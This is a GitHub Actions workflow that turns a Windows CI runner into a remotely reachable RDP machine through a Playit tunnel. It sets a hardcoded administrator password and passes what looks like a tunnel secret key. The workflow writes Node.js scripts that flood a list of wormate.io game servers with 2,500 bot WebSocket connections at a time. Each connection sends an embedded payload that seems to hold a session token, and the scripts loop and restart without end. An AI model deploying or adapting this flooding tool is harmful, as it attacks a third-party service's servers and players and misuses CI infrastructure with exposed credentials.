name: Playit RDP Tunnel

on:
  workflow_dispatch:

jobs:
  setup-rdp-tunnel:
    runs-on: windows-latest

    steps:
    - name: Check out the repository
      uses: actions/checkout@v2

    - name: Download and Install Playit
      run: |
        Invoke-WebRequest -Uri "https://github.com/playit-cloud/playit-agent/releases/download/v0.15.26/playit-windows-x86_64-signed.exe" -OutFile "$env:USERPROFILE\playit.exe"
        Start-Sleep -Seconds 5

    - name: Enable Remote Desktop
      run: |
        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
        Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "p@ssw0rd!" -Force)

    - name: Install Node.js
      uses: actions/setup-node@v4
      with:
        node-version: '20'

    - name: Create klo.js and all2.js files
      run: |
        Set-Content -Path "$env:USERPROFILE\klo.js" -Value @"
const { spawn } = require('child_process');

function runScript() {
  console.log(\`Starting all.js at \${new Date().toLocaleTimeString()}\`);

  const child = spawn('node', ['all2.js'], {
    stdio: 'inherit'
  });

  setTimeout(() => {
    console.log(\`estarting all.js at \${new Date().toLocaleTimeString()}\`);
    child.kill();
    runScript();
  }, 10 * 60 * 1000);
}

runScript();
"@

        Set-Content -Path "$env:USERPROFILE\all2.js" -Value @"
const WebSocket = require('ws');

const SERVER_URLS = [
  'wss://fra-c.wormate.io:32053/wormy',
  'wss://fra-c.wormate.io:32609/wormy',
  'wss://fra-c.wormate.io:32103/wormy',
  'wss://fra-c.wormate.io:32064/wormy',
  'wss://fra-c.wormate.io:32708/wormy',
  'wss://fra-c.wormate.io:32285/wormy',
  'wss://fra-c.wormate.io:32017/wormy',
  'wss://fra-c.wormate.io:32095/wormy',
  'wss://fra-c.wormate.io:31050/wormy',
  'wss://fra-c.wormate.io:31280/wormy',
  'wss://fra-c.wormate.io:32044/wormy',
  'wss://fra-c.wormate.io:32249/wormy',
  'wss://fra-c.wormate.io:30377/wormy',
  'wss://fra-c.wormate.io:32262/wormy'
];

const hexPayload = '810af00104af00670067005f00650079004a00680062004700630069004f0069004a00530055007a00490031004e0069004900730049006d00740070005a0043004900360049006d00590078004d0044004d007a004f004400590077004e007a00450032005a0054004e0068004d006d004600680059006a004d0034004d004700590077004d004700520069005a0054004d00350059005400630078004d005400510034004e0044005a00690059005400450069004c0043004a00300065005800410069004f0069004a004b005600310051006900660051002e00650079004a007000630033004d0069004f0069004a006800590032004e00760064005700350030006300790035006e006200320039006e00620047005500750059003200390074004900690077006900590058007000770049006a006f0069004f005400550035004e004400490031004d0054006b0079004d0054004d0034004c005800460071006300540049007a00620044006c006c004d00470039006f004f00470078006e005a0044004a0070005900320035006900620048004a0069005a006d004a0073005900580049003000590054004a006d004c006d0046007700630048004d0075005a003200390076005a00320078006c00640058004e006c0063006d004e00760062006e0052006c0062006e0051007500590032003900740049006900770069005900580056006b0049006a006f0069004f005400550035004e004400490031004d0054006b0079004d0054004d0034004c005800460071006300540049007a00620044006c006c004d00470039006f004f00470078006e005a0044004a0070005900320035006900620048004a0069005a006d004a0073005900580049003000590054004a006d004c006d0046007700630048004d0075005a003200390076005a00320078006c00640058004e006c0063006d004e00760062006e0052006c0062006e005100750059003200390074004900690077006900630033005600690049006a006f0069004d005400410078004d006a004d0078004d00540063007a004e004400510078004d007a00410034004f004400550032004e0054006b00330049006900770069005a0057003100680061005700770069004f0069004a00740062003200680076006200570046006f00640058004d0030004d00450042006e0062005700460070006200430035006a0062003200300069004c0043004a006c00620057004600700062004600390032005a0058004a0070005a006d006c006c005a00430049003600640048004a0031005a0053007700690059005800520066006100470046007a00610043004900360049006b003500360056006c006400310064007a004a0070005300480067003200640056004200430062006a005600610053004700680074005a006d00630069004c0043004a00750059006d00590069004f006a00450033004e005400490032004e006a00510077004e0054004500730049006d003500680062005700550069004f0069004c005900720064006d00450032004b00660059006e0079004900730049006e0042007000590033005200310063006d00550069004f0069004a006f00640048005200770063007a006f0076004c00320078006f004d00790035006e006200320039006e0062004700560031006300320056007900590032003900750064004700560075006400430035006a00620032003000760059005300390042005100320063003400620032004e004b005100550067007700620044004600570055007a006800500056003200520051004d0044006400560056007a006b0077005400300059007800530048004e00790051005500310035006400480042007000640030005a003400560058006c006800650057007400760054004700520045004f00570056005a004e00330064005600500058004d0035004e00690031006a0049006900770069005a0032006c0032005a0057003500660062006d00460074005a005300490036004900740069007400320059005400590070003900690066004900690077006900610057004600300049006a006f0078004e007a00550079004e006a00590030004d007a00550078004c0043004a006c0065004800410069004f006a00450033004e005400490032004e006a00630035004e0054004500730049006d0070003000610053004900360049006a004d0033004e0044006b00770059003200520069004f00540046006b005900320059007a005a0047004d0079005a004400670034005a0044006b00300059006d0046006a0059005400450078004f00570045007a004d0044004a0069004e0054006c006a004d006a0045006900660051002e004d0073003200520038004500310061004800740069004d00470071003500540062007a00520063006b006c0071005f004100710072004a0053004900310071004b00580072004c00550065005600650068004c0043005800720047003100770047006e00590039004c005300570051003100490046006f0069006a0061007700370070005a006500770051004100610069006200430059006c0044002d00730057004b0078004a006f0030003300680042006500440039004e00740059002d0046005600660053004600470049004400410037004500640050006200420074006f0059004d00500057007a0064004400720052006e0052004d004d005700620037004100430049006b0034005f007400610069006b006e007800310078006b0051007900760046003600300046007400560042006800550045005f0035004d0030004e006a00470035005f003200650077004100500075004d0078007a0063004c006900750030004e005a007100740048006e00620075007300530049004900310030003500480038004c006f006e007700350046006f0070006b0072005f003400330067002d004100350061005700440058003300360039006900370057005700640050004d00490062006f0030004c0056002d004f0031006b00500067004400680031004d004800370077004e00380041005a003100450050007400410057007400490034006a00300059007a005200740066005200760046006a00790053003100300034004b004e005a0034006c005000460041007800680041005f004f0079004a006e004e005100390075002d003500610062006a005f0056004600360058003200350048004f004f004c005600590056006a006f00570031006100540037007a00440067004b006d005800380041005300570030005a00740059006f004c00360030004c0067'; // ظƒط§ظ…ظ„ ط§ظ„ط¨ط§ظٹظ„ظˆط¯ ط¨طھط§ط¹ظƒ ظ‡ظ†ط§
const BOT_COUNT = 2500;
const buffer = Buffer.from(hexPayload.replace(/[^a-fA-F0-9]/g, ''), 'hex');
const pingPayload = Buffer.from([0x00]);

let currentServerIndex = 0;

async function sendBotsToServer(url) {
  console.log(\`\\nclosing \${url}\`);
  return new Promise((resolve) => {
    let sentCount = 0;
    let closedCount = 0;

    for (let i = 0; i < BOT_COUNT; i++) {
      const ws = new WebSocket(url);

      ws.on('open', () => {
        ws.send(buffer);
        sentCount++;

        const interval = setInterval(() => {
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(pingPayload);
          } else {
            clearInterval(interval);
          }
        }, 1000);

        if (sentCount % 500 === 0 || sentCount === BOT_COUNT) {
          console.log(\`closing payload #\${sentCount} to \${url}\`);
        }
      });

      const finish = () => {
        closedCount++;
        if (closedCount === BOT_COUNT) {
          resolve();
        }
      };

      ws.on('error', finish);
      ws.on('close', finish);
    }
  });
}

async function loopForever() {
  while (true) {
    const url = SERVER_URLS[currentServerIndex];
    await sendBotsToServer(url);
    currentServerIndex = (currentServerIndex + 1) % SERVER_URLS.length;
  }
}

loopForever();
"@

    - name: Create desktop shortcut for klo.js
      run: |
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\Start KLO.lnk")
        $Shortcut.TargetPath = "C:\Program Files\nodejs\node.exe"
        $Shortcut.Arguments = "$env:USERPROFILE\klo.js"
        $Shortcut.WorkingDirectory = "$env:USERPROFILE"
        $Shortcut.WindowStyle = 1
        $Shortcut.IconLocation = "C:\Program Files\nodejs\node.exe"
        $Shortcut.Save()

    - name: Start Playit Tunnel (RDP)
      run: |
        Start-Process -FilePath "$env:USERPROFILE\playit.exe" -ArgumentList "dd770bf9435defb023f4f2892aa254f494d582e09ea5aa395b745bda8d07666f" -NoNewWindow -Wait
        Start-Process -FilePath "$env:USERPROFILE\playit.exe" -NoNewWindow

    - name: Keep Action Runner Alive
      run: |
        Start-Sleep -Seconds 11800
